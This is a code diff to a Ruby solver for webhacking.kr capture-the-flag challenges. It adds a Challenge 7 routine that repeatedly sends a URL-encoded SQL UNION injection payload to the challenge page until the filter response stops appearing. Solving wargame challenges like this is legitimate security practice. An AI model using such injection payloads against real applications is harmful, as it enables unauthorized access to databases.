@@ -305,6 +305,28 @@ module WebhackingKR
   end
 
   ##
+  # Challenge 7
+  class Challenge7 < ChallengeBase
+    CHALLENGE = 7
+
+    PATH = '/challenge/web-07/'
+    QUERY = '?val='
+    PAYLOAD = %q[SELECT(3))UNION(SELECT(SUBSTR(HEX(34),1,1)))#]
+
+    def exec
+      log('Trying send payload')
+      loop do
+        payload = URI.encode_www_form_component(PAYLOAD)
+        response = get("#{PATH}#{QUERY}#{payload}")
+        next if response.body =~ /nice try!/
+
+        check(response.body)
+        break
+      end
+    end
+  end
+
+  ##
   # Challenge 10
   class Challenge10 < ChallengeBase
     CHALLENGE = 10
@@ -469,8 +491,6 @@ module WebhackingKR
           { 'Cookie' => "st=#{st}" }
         )
         check(response.body)
-      rescue Interrupt
-        return
       end
     end
   end
